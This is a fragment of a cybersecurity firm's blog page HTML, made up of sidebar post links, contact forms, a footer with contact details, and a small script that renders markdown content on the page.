book">UnitedHealth Breach</a></div><div role="listitem" class="collection-item-8 w-dyn-item"><a href="/posts/navigating-sec-disclosures-and-materiality" class="blog-sidebar-link book">Navigating SEC Cybersecurity Disclosures and Materiality</a></div></div></div></div><div class="blog-sidebar-section"><div class="text-block-13">Let's Talk</div><div class="w-form"><form id="email-form-2" name="email-form-2" data-name="Email Form 2" method="get" data-wf-page-id="611d378b438aa38cbe27d6e3" data-wf-element-id="f02e9931-89bb-1819-b977-2452fd561105" aria-label="Email Form 2"><label for="name" class="field-label-8">Name</label><input class="w-input" maxlength="256" name="name" data-name="Name" placeholder="" type="text" id="name"><label for="email-7" class="field-label-9">Email Address</label><input class="w-input" maxlength="256" name="email-7" data-name="Email 7" placeholder="" type="email" id="email-7" required=""><label for="field" class="field-label-10">Message</label><textarea placeholder="" maxlength="5000" id="field" name="field" data-name="Field" class="textarea-2 w-input"></textarea><input type="submit" data-wait="Please wait..." class="submit-button-2 w-button" value="Submit"></form><div class="w-form-done" tabindex="-1" role="region" aria-label="Email Form 2 success"><div>Thank you! Your submission has been received!</div></div><div class="w-form-fail" tabindex="-1" role="region" aria-label="Email Form 2 failure"><div>Oops! Something went wrong while submitting the form.</div></div></div></div></div></div></div><div id="lets-talk" class="footer"><div class="container"><div class="div-block"><div class="div-block-2"><div class="text-block blackitalic">Let’s Talk</div><div class="div-block-21"><div class="text-block-10">Stay Connected</div><a href="mailto:watchmen@fortalicesolutions.com" class="w-inline-block"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa360a527d727_email.svg" loading="lazy" alt="" class="footer-social-icon"></a><a href="https://www.facebook.com/FortaliceSolutions" target="_blank" class="w-inline-block"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa3282627d721_facebook.svg" loading="lazy" alt="" class="footer-social-icon"></a><a href="https://twitter.com/FortaliceLLC" target="_blank" class="w-inline-block"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa3385827d723_twitter.svg" loading="lazy" alt="" class="footer-social-icon"></a><a href="https://www.linkedin.com/company/fortalicellc/" target="_blank" class="w-inline-block"><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa3819d27d722_linkedin.svg" loading="lazy" alt="" class="footer-social-icon"></a></div><img src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/611d378b438aa36a7b27d70b_logo-lightblue.svg" loading="lazy" alt="" class="image-5"><div class="text-block-11">Fortified Security</div><p class="paragraph-8">US: 877.487.8160 <br>watchmen@fortalicesolutions.com<br>EMEA: 0800.824.7030 <br>emea@fortalicesolutions.co.uk</p><div class="div-block-22"></div><a href="/privacy-policy" class="link-5">Privacy Policy</a><div class="div-block-51"><div class="text-block-22">©2024 FORTALICE SOLUTIONS LLC. All rights reserved.</div></div></div><div class="div-block-3"><div class="div-block-23"><div class="w-form"><form id="email-form" name="email-form" data-name="Email Form" method="get" class="form" data-wf-page-id="611d378b438aa38cbe27d6e3" data-wf-element-id="4b4f002c-df7d-fb05-15f2-f4eb9340bfe6" aria-label="Email Form"><div class="field"><label for="First-Name" class="field-label-2">First Name*</label><input class="w-input" maxlength="256" name="First-Name" data-name="First Name" placeholder="" type="text" id="First-Name" required=""></div><div class="field"><label for="Last-Name" class="field-label-3">Last Name*</label><input class="w-input" maxlength="256" name="Last-Name" data-name="Last Name" placeholder="" type="text" id="Last-Name" required=""></div><div class="field"><label for="Email-6" class="field-label-5">Email*</label><input class="w-input" maxlength="256" name="Email" data-name="Email" placeholder="" type="email" id="Email-6" required=""></div><div class="field"><label for="Phone" class="field-label-4">Phone</label><input class="w-input" maxlength="256" name="Phone" data-name="Phone" placeholder="" type="tel" id="Phone"></div><div class="field"><label for="Company" class="field-label-6">Company Name</label><input class="w-input" maxlength="256" name="Company" data-name="Company" placeholder="" type="text" id="Company" required=""></div><div class="field"><label for="Title" class="field-label-7">Title</label><input class="w-input" maxlength="256" name="Title" data-name="Title" placeholder="" type="text" id="Title"></div><div class="div-block-25"><label for="Message" class="field-label">Message</label><textarea id="Message" name="Message" maxlength="140" data-name="Message" placeholder="" class="textarea w-input"></textarea></div><div class="div-block-54"><div class="w-form-formrecaptcha g-recaptcha g-recaptcha-error g-recaptcha-disabled g-recaptcha-invalid-key"></div></div><div class="div-block-24"><input type="submit" data-wait="Please wait..." class="submit-button w-button" value="SEND MESSAGE"></div></form><div class="w-form-done" tabindex="-1" role="region" aria-label="Email Form success"><div>Thank you! Your submission has been received!</div></div><div class="w-form-fail" tabindex="-1" role="region" aria-label="Email Form failure"><div>Oops! Something went wrong while submitting the form.</div></div></div></div><a href="/privacy-policy" class="link-6">Privacy Policy</a><div class="div-block-52"><div class="text-block-22">©2024 FORTALICE SOLUTIONS LLC. All rights reserved.</div></div></div></div></div></div><script src="https://d3e54v103j8qbb.cloudfront.net/js/jquery-3.5.1.min.dc5e7f18c8.js?site=611d378b438aa3f85927d6dc" type="text/javascript" integrity="sha256-9/aliU8dGd2tb6OSsuzixeV4y/faTqgFtohetphbbj0=" crossorigin="anonymous"></script><script src="https://assets-global.website-files.com/611d378b438aa3f85927d6dc/js/webflow.4aebfde91.js" type="text/javascript"></script><script>
  function rtfToMarkdown(el) {
    let txt = el.innerHTML;
    txt = txt.replace(/<p>/g, '');
    txt = txt.replace(/<\/p>/g, '\n\n');
    txt = txt.replace(/<br>/g, '\n');
    txt = txt.replace(/&amp;nbsp;/g, ' ');
    txt = txt.replace(/</g, '<');
    txt = txt.replace(/&amp;gt;/g, '>');
    txt = txt.replace(/&amp;amp;lt;/g, '<');
    txt = txt.replace(/&lt;/g, '<');
    txt = txt.replace(/&gt;/g, '>');
    txt = txt.replace(/&amp;/g, '&');
    // console.log(txt);
    return txt;
  }
  function markdownToHtml(txt) {
    let converter = new showdown.Converter({
      noHeaderId: false,
      headerLevelStart: 3,
      literalMidWordUnderscores: true,
      ghCompatibleHeaderId: true
    });
    let html = converter.makeHtml(txt);
    // console.log(html);
    return html;
  }
  // if there are elements with a class named 'markdown'
  // attached, first convert their content to html
  let markdowns = $('.markdown');
  markdowns.toArray().forEach((el) => {
    let txt = rtfToMarkdown(el),
        html = markdownToHtml(txt);
    el.innerHTML = html;
  });
  hljs.highlightAll();
  
</script><a class="w-webflow-badge" href="https://webflow.com?utm_campaign=brandjs"><img src="https://d3e54v103j8qbb.cloudfront.net/img/webflow-badge-icon-d2.89e12c322e.svg" alt="" style="margin-right: 4px; width: 26px;"><img src="https://d3e54v103j8qbb.cloudfront.net/img/webflow-badge-text-d2.c82cec3b78.svg" alt="Made in Webflow"></a></body></html>